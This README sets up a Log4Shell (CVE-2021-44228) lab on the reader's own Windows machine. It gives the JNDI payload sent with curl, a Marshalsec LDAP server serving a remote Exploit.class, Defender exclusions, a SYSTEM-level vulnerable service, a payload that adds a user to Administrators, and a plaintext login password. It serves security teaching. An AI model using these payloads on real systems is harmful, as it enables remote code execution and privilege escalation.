# Log4Shell (CVE-2021-44228) Demonstration Setup

## Overview

This setup transforms your Windows 11 system into a demonstration target for **CVE-2021-44228** (Log4Shell), one of the most critical vulnerabilities from the CISA Known Exploited Vulnerabilities catalog.

### What This Accomplishes

1. **Installs vulnerable software** - Java service using Log4j 2.14.0 (vulnerable version)
2. **Runs as SYSTEM** - Service has highest Windows privileges for maximum demo impact
3. **Low-privilege exploit** - The `sshguest` account can exploit it for privilege escalation
4. **Safe demonstration** - Uses your own system, benign payload, controlled environment

### The Exploit Flow

```
sshguest (low privilege) 
    ↓ 
Sends malicious HTTP request to Java service
    ↓
Log4j processes JNDI lookup: ${jndi:ldap://attacker:1389/Exploit}
    ↓
Downloads and executes Exploit.class as LocalSystem
    ↓
sshguest gains Administrator privileges
```

## Prerequisites

- Windows system with Administrator access (sshadmin account)
- Internet connection for downloading dependencies
- PowerShell execution policy allows scripts
- Python 3.x installed (for running setup script)

## Setup Instructions

### Step 1: Copy Setup Script

1. **Copy the setup script** to your Windows machine:
   ```bash
   scp log4shell_setup.py sshadmin@10.1.60.232:C:/Users/sshadmin/Desktop/
   ```

2. **SSH into your Windows machine as admin**:
   ```bash
   ssh sshadmin@10.1.60.232
   # Password: exploit :-)
   ```

### Step 2: Run Setup (As Administrator)

3. **Open PowerShell as Administrator**:
   ```powershell
   # Right-click Start button → Windows Terminal (Admin)
   # Or from current session:
   Start-Process powershell -Verb RunAs
   ```

4. **Execute the setup script**:
   ```powershell
   cd C:\Users\sshadmin\Desktop
   python log4shell_setup.py
   ```

The script will:
- ✅ Add Windows Defender exclusions for C:\lab
- ✅ Download and install OpenJDK 8
- ✅ Download Marshalsec and Log4j 2.14.0 
- ✅ Build vulnerable HTTP server (Java app)
- ✅ Build exploit payload (Exploit.class)
- ✅ Download NSSM (service wrapper)
- ✅ Install vulnerable app as Windows service
- ✅ Configure service to run as LocalSystem
- ✅ Create demonstration scripts

### Step 3: Verify Setup

5. **Check that everything is working**:
   ```powershell
   cd C:\lab
   python check_setup.py
   ```

   You should see:
   ```
   ✓ VulnerableApp Service: RUNNING
   ✓ Port 8080 (HTTP): LISTENING
   ✓ Vulnerable app responding to HTTP requests
   ```

6. **Test basic connectivity**:
   ```powershell
   curl http://localhost:8080
   # Should return: "Request logged successfully"
   ```

## Demonstration Execution

### Phase 1: Show Current Privileges (as sshguest)

7. **SSH as low-privilege user**:
   ```bash
   ssh sshguest@10.1.60.232
   # Password: BduqHOzRDoh7jha43BEBeOYZ
   ```

8. **Show current privileges**:
   ```cmd
   whoami
   # Should show: desktop-g3h7f6f\sshguest
   
   whoami /priv
   # Should show limited privileges
   
   net localgroup administrators
   # Should NOT include sshguest
   ```

### Phase 2: Set Up Exploit Infrastructure

9. **Set up LDAP server** (in one terminal):
   ```cmd
   cd C:\lab\marshalsec\marshalsec-master
   # Note: You'll need to compile Marshalsec first or use pre-built JAR
   java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Exploit" 1389
   ```

10. **Start HTTP server** (in another terminal):
    ```cmd
    cd C:\lab
    python -m http.server 8888 --directory exploits
    ```

### Phase 3: Execute Log4Shell Exploit

11. **Send malicious request**:
    ```cmd
    curl -H "User-Agent: ${jndi:ldap://127.0.0.1:1389/Exploit}" http://127.0.0.1:8080/
    ```

### Phase 4: Verify Privilege Escalation

12. **Check for successful exploit**:
    ```cmd
    # Check if exploit proof file was created (as SYSTEM)
    type C:\lab\exploit_proof.txt
    # Should show: EXPLOITED
    
    # Check if sshguest was added to Administrators
    net localgroup administrators
    # Should now include sshguest
    
    whoami /priv
    # Should show elevated privileges
    ```

## Technical Details

### Why This Works

1. **Vulnerable Log4j Version**: Using 2.14.0 which processes JNDI lookups
2. **Service Context**: Java app runs as LocalSystem (highest Windows privilege)
3. **JNDI Injection**: Log4j processes `${jndi:ldap://...}` in logged strings
4. **Remote Class Loading**: LDAP server redirects to HTTP server serving exploit
5. **Code Execution**: Exploit.class executes in LocalSystem context

### Security Notes

- **Controlled Environment**: Your own system, benign payload
- **Reversible**: Can remove service and lab directory when done
- **Educational**: Demonstrates real CVE with practical impact
- **Safe Payload**: Only creates file and adds user to admin group

### Troubleshooting

**Service won't start:**
```powershell
# Check service status
sc query VulnerableApp

# Check service logs
Get-EventLog -LogName Application -Source VulnerableApp -Newest 10
```

**Java not found:**
```powershell
# Verify Java installation
java -version

# Check PATH
echo $env:PATH
```

**Firewall blocking:**
```powershell
# Add firewall rules if needed
New-NetFirewallRule -DisplayName "Log4Shell Demo HTTP" -Direction Inbound -Port 8080 -Protocol TCP -Action Allow
New-NetFirewallRule -DisplayName "Log4Shell Demo LDAP" -Direction Inbound -Port 1389 -Protocol TCP -Action Allow
```

## Cleanup

To remove the demonstration environment:

```powershell
# Stop and remove service
net stop VulnerableApp
sc delete VulnerableApp

# Remove lab directory
Remove-Item -Recurse -Force C:\lab

# Remove Defender exclusions
Remove-MpPreference -ExclusionPath "C:\lab"

# Remove sshguest from administrators
net localgroup administrators sshguest /delete
```

## CISA KEV Context

**CVE-2021-44228** appears in the CISA catalog because:
- **CVSS Score**: 10.0 (Critical)
- **Exploitation**: Actively exploited in the wild
- **Impact**: Remote Code Execution as application user
- **Ubiquity**: Log4j used in millions of Java applications
- **Ease**: Simple HTTP request can trigger exploit

This demonstration shows exactly why this vulnerability required emergency patching across all internet-facing Java applications in December 2021.